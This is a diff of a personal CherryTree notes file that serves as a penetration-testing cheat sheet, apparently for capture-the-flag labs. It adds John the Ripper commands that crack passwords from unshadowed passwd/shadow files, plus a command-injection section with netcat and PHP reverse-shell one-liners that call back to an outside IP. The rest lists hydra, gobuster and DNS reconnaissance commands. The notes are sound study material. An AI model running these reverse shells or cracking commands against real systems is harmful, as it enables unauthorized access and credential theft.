@@ -1,6 +1,6 @@
 <?xml version="1.0" ?>
 <cherrytree>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="bruteforce" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393552.82" ts_lastsave="1655395111.92" unique_id="1">
+	<node custom_icon_id="0" foreground="" is_bold="False" name="bruteforce_cracking" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393552.82" ts_lastsave="1655481351.61" unique_id="1">
 		<rich_text></rich_text>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="hydra" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393562.61" ts_lastsave="1655393676.75" unique_id="2">
 			<rich_text>SSH bruteforce
@@ -16,6 +16,22 @@ hydra -L &lt;username_file&gt; -P &lt;password_file&gt; &lt;host&gt; https-post-
 		</node>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="fcrackzip" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393573.93" ts_lastsave="1655393597.21" unique_id="3">
 			<rich_text>fcrackzip -u -D -p &lt;wordlist&gt; &lt;file&gt;</rich_text>
+		</node>
+		<node custom_icon_id="0" foreground="" is_bold="False" name="john_the_ripper" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655481131.37" ts_lastsave="1655483281.87" unique_id="38">
+			<rich_text>automatic cracking
+john --wordlist=[path to wordlist] [path to file]
+
+hash identifier
+wget https://gitlab.com/kalilinux/packages/hash-identifier/-/raw/kali/master/hash-id.py
+python3 hash-id.py
+
+unshadow [path to passwd] [path to shadow]
+
+specify format
+john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt unshadowed.txt
+
+</rich_text>
+			<rich_text family="monospace">rar2john [rar file] &gt; [output file]</rich_text>
 		</node>
 	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="compressions" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655393695.98" ts_lastsave="1655393786.4" unique_id="4">
@@ -168,7 +184,7 @@ systemctl start &lt;service_name&gt;
 
 stopping sevice
 systemctl stop &lt;service_name&gt;</rich_text>
-			<node custom_icon_id="0" foreground="" is_bold="False" name="text_filtering" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394284.9" ts_lastsave="1655394326.05" unique_id="21">
+			<node custom_icon_id="0" foreground="" is_bold="False" name="text_processing" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394284.9" ts_lastsave="1655481308.89" unique_id="21">
 				<rich_text foreground="#d4d4d4">default
 cat &lt;file&gt; | grep &lt;search&gt;</rich_text>
 				<rich_text>
@@ -316,7 +332,7 @@ dig &lt;ip/domain_target&gt;
 whois
 whois &lt;ip/domain_target&gt;</rich_text>
 		</node>
-		<node custom_icon_id="0" foreground="" is_bold="False" name="gobuster" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394811.27" ts_lastsave="1655394825.46" unique_id="30">
+		<node custom_icon_id="0" foreground="" is_bold="False" name="gobuster" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394811.27" ts_lastsave="1655471333.24" unique_id="30">
 			<rich_text>gobuster dir -u </rich_text>
 			<rich_text link="webs http://&lt;url&gt;">http://&lt;url&gt;</rich_text>
 			<rich_text> -w &lt;path_to_wordlist&gt;</rich_text>
@@ -415,6 +431,14 @@ nslookup --type=MX website.thm
 nslookup --type=TXT website.thm</rich_text>
 		</node>
 	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="exploit" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471333.24" ts_lastsave="1655471362.28" unique_id="36">
+		<rich_text></rich_text>
+	</node>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="command_injection" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655471362.28" ts_lastsave="1655471836.88" unique_id="37">
+		<rich_text>Reverse
+nc 172.16.1.100 1234 -e /bin/sh
+php -r '$sock=fsockopen(&quot;10.0.0.1&quot;,1234);exec(&quot;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&quot;);'</rich_text>
+	</node>
 	<node custom_icon_id="0" foreground="" is_bold="False" name="tests" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394210.03" ts_lastsave="1655395012.38" unique_id="19">
 		<rich_text></rich_text>
 		<node custom_icon_id="0" foreground="" is_bold="False" name="note.dtd" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655395012.38" ts_lastsave="1655395016.26" unique_id="33">
@@ -482,58 +506,10 @@ nslookup --type=TXT website.thm</rich_text>
 			<rich_text foreground="#808080">&gt;</rich_text>
 		</node>
 	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="lab_ideas" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394224.89" ts_lastsave="1655395204.23" unique_id="20">
-		<rich_text foreground="#6796e6">1.</rich_text>
-		<rich_text foreground="#d4d4d4"> buy switch and setup a vlan</rich_text>
-		<rich_text>
-</rich_text>
-		<rich_text foreground="#6796e6">2.</rich_text>
-		<rich_text foreground="#d4d4d4"> buy a public ip and setup VPN</rich_text>
-		<rich_text>
-</rich_text>
-		<rich_text foreground="#6796e6">3.</rich_text>
-		<rich_text foreground="#d4d4d4"> setup mailserver and analyze traffic</rich_text>
-		<rich_text>
-4. </rich_text>
-		<rich_text foreground="#d4d4d4">setup webserver and analyze traffic </rich_text>
-		<rich_text>
-</rich_text>
-		<rich_text foreground="#6796e6">5.</rich_text>
-		<rich_text foreground="#d4d4d4"> emulate arp spoofing / mac spoofing with the help of the router</rich_text>
-		<rich_text>
-</rich_text>
-		<rich_text foreground="#6796e6">6.</rich_text>
-		<rich_text foreground="#d4d4d4"> emulate evil twin attack</rich_text>
-		<rich_text>
-</rich_text>
-		<rich_text foreground="#6796e6">7.</rich_text>
-		<rich_text foreground="#d4d4d4"> content delivery network seems interesting, can I run a cdn emulation?</rich_text>
-		<rich_text>
-</rich_text>
-		<rich_text foreground="#6796e6">8.</rich_text>
-		<rich_text foreground="#d4d4d4"> looking through website like twitter or whatsapp, it's fascinating how our application got updated, do main server just send update or what's going on?</rich_text>
-		<rich_text>
-</rich_text>
-		<rich_text foreground="#6796e6">9.</rich_text>
-		<rich_text foreground="#d4d4d4"> play with iptables / making NAT server</rich_text>
-		<rich_text>
-</rich_text>
-		<rich_text foreground="#6796e6">10.</rich_text>
-		<rich_text foreground="#d4d4d4"> try making DNS server</rich_text>
-		<rich_text>
-</rich_text>
-		<rich_text foreground="#6796e6">11.</rich_text>
-		<rich_text foreground="#d4d4d4"> weedee learn about NAT compartmentalization AWS</rich_text>
-		<rich_text>
-</rich_text>
-		<rich_text foreground="#6796e6">12.</rich_text>
-		<rich_text foreground="#d4d4d4"> VPN on a system with sysmon, to check dns query is it detected</rich_text>
-		<rich_text>
-</rich_text>
-		<rich_text foreground="#6796e6">13.</rich_text>
-		<rich_text foreground="#d4d4d4"> setup public available mysql service, play around with it</rich_text>
+	<node custom_icon_id="0" foreground="" is_bold="False" name="lab_ideas" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655394224.89" ts_lastsave="1655397167.66" unique_id="20">
+		<rich_text></rich_text>
 	</node>
-	<node custom_icon_id="0" foreground="" is_bold="False" name="general_items" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655395204.23" ts_lastsave="1655395262.15" unique_id="35">
+	<node custom_icon_id="0" foreground="" is_bold="False" name="general_items" prog_lang="custom-colors" readonly="False" tags="" ts_creation="1655395204.23" ts_lastsave="1655395274.29" unique_id="35">
 		<rich_text foreground="#d4d4d4">pipelining:</rich_text>
 		<rich_text>
 </rich_text>
@@ -548,11 +524,16 @@ nslookup --type=TXT website.thm</rich_text>
 		<rich_text foreground="#ce9178">&quot;append text&quot;</rich_text>
 		<rich_text foreground="#d4d4d4"> &gt;&gt; &lt;filename&gt;</rich_text>
 		<rich_text>
+
 </rich_text>
-		<rich_text foreground="#d4d4d4">check current userwhoami</rich_text>
+		<rich_text foreground="#d4d4d4">check current user
+whoami</rich_text>
 		<rich_text>
+
 </rich_text>
 		<rich_text foreground="#d4d4d4">check current directory </rich_text>
+		<rich_text>
+</rich_text>
 		<rich_text foreground="#dcdcaa">pwd</rich_text>
 	</node>
 </cherrytree>
